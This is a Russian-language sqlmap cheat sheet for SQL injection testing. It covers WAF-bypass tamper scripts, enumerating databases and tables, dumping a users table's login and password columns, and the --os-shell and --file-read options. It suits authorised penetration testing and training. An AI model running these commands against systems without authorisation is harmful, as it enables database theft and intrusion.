@@ -1,0 +1,120 @@
+Способ 1:
+Копируем URL с нужным параметром
+sqlmap -u http://host:port/?param=1 -p param
+Способ 2:
+Копируем в файл нужный запрос из Burp.
+
+sqlmap -r req.txt -p id --batch --level=1 --risk=1
+
+-p id - параметр, который тестим на инъекции.
+--batch - без задавания вопросов.
+
+
+Что будет тестироваться:
+--level=
+1 - только параметры (POST или GET запросов)
+2 - +cookie
+3 - +User-Agent / Refer
+5 - +все заголовки, включая HOST.
+
+Какие инъекции будут прогоняться:
+--risk= 
+1 - Boolean / Error based (безвредно)
+2 - UNION / подзапросы / логические запросы, более сложные
+3 - timebased
+
+sqlmap -r req.txt --dbms=mysql --threads=5 --random-agent --batch
+
+--dbms=mysql — явно указать СУБД
+--threads=5 - поточность
+--random-agent — подстановка случайного User-Agent из файла /usr/share/sqlmap/data/txt/user-agents.txt
+
+
+sqlmap -r req.txt --level=3 --risk=2 --technique=BEUST --dbms=mysql --threads=5 --random-agent --tamper=space2comment
+
+
+--technique=BEUST
+Boolean, Error, union, Stacked, Time
+Если точно указать технику --technique=T
+--tamper=space2comment - скрипт обхода WAF
+
+Все доступные tamper скрипты, если что, находятся по пути: /usr/share/sqlmap/tamper
+sqlmap --list-tampers
+
+
+sqlmap -r req.txt --proxy=http://127.0.0.1:8080 --delay=2 --time-sec=10 --random-agent --tamper=between,randomcase --level=2 --risk=2
+
+--proxy - направить трафик через Burp, для анализа/логирования
+
+--delay=2 - пауза 2 сек между запросами
+
+--time-sec=1 для тайм бэйсд инъекций увеличить таймаут до 10 сек, по умолчанию 5
+
+sqlmap -u http://127.0.0.1:5000/?params=1 --timeout 1 --ignore-timeouts --batch --technique=U -p params --proxy=http://127.0.0.1:8080
+
+--timeout=SECONDS / timeout MIN - время в секундах/минутах, которое инструмент ждет ответа от сервера перед тем, как считать запрос неудачным и прервать его.
+по умолчанию значение равно 30 сек.
+
+--ignore-timeouts - игнорировать ошибки таймаута соединения
+
+--retries=N - кол-во попыток повторной отправки запроса при таймауте (по умолчанию 3)
+
+список баз данных
+sqlmap -r req.txt --batch --dbms=mysql --dbs
+таблицы в БД
+sqlmap -r req.txt --batch --dbms=mysql -D db_name --tables
+колонки
+sqlmap -r req.txt --batch --dbms=mysql -D db_name -T users --columns
+дамп данных
+sqlmap -r req.txt --batch --dbms=mysql -D db_name -T users -C user,password --dump
+
+
+tamper-скрипты
+Модифицируют пейлоады перед отправкой. Задача - обойти фильтры WAF, IPS
+Скрипты применяются последовательно, в том порядке через запятую, в котором перечислены в опции --tamper==
+
+
+
+Примеры команд:
+sqlmap -r forsqlmap --proxy=http://127.0.0.1:8080 --dbms=oracle -p category --level=1 --risk=2 --batch --force-ssl
+
+
+трафик перенаправляется в Burp, и на всякий используется опция --force-ssl, чтобы не падал с ошибками если сайт
+недоступен через http.
+
+sqlmap -r forsql --proxy=http://127.0.0.1:8080 --level=2 --risk=2 --batch --force-ssl
+sqlmap -r forsq --proxy=http://127.0.0.1:8080 --level=1 --risk=2 --batch --force-ssl --dbms=postgresql --dbs --technique=U
+
+
+Сохранить результаты в свою директорию:
+sqlmap -r forsq --proxy=http://127.0.0.1:8080 --level=1 --risk=1 --batch --force-ssl --dbms=postgresql --dbs --technique=U --output-dir=./res
+
+Перенаправить весь вывод в файл:
+sqlmap -r forsq --proxy=http://127.0.0.1:8080 --level=1 --risk=1 --batch --force-ssl --dbms=postgresql --dbs --technique=U 2>&1 | tee scan.log
+
+
+Иногда можно потестить просто определенный параметр.
+sqlmap -r req -p id --batch
+Можно тестировать несколько параметров: -p id,cat,sort
+Или один определенно.
+
+Опции --string "строка" и --not-string "строка" в sqlmap нужны при тестировании
+boolean-слепой SQLi, чтобы различать ответы сервера.
+При --string указывать строку, которая появляется при TRUE ответе и отсутствует при FALSE.
+--not-string - наоборот.
+
+
+Обновить sqlmap до последней версии:
+sudo sqlmap --update
+
+--privileges - проверить доступные привилегии пользователя СУБД.
+--os-shell - попробовать установить обратную оболочку
+--file-read="файл" - прочитать содержимое файла с хоста, если доступно privilege: FILE
+
+
+Когда хост плохо доступен:
+sqlmap -u "http://target.com/page.php?id=1" --timeout=60 --retries=5 --batch
+ждать ответ до 60 секунд, если ответ не пришел повторить запрос до 5 раз
+
+sqlmap -u "http://target.com/page.php?id=1" --timeout=20 --retries=2 --ignore-timeouts --batch
+Даже если запрос завершился таймаутом после 20 сек и двух повторных попыток, sqlmap не остановится.
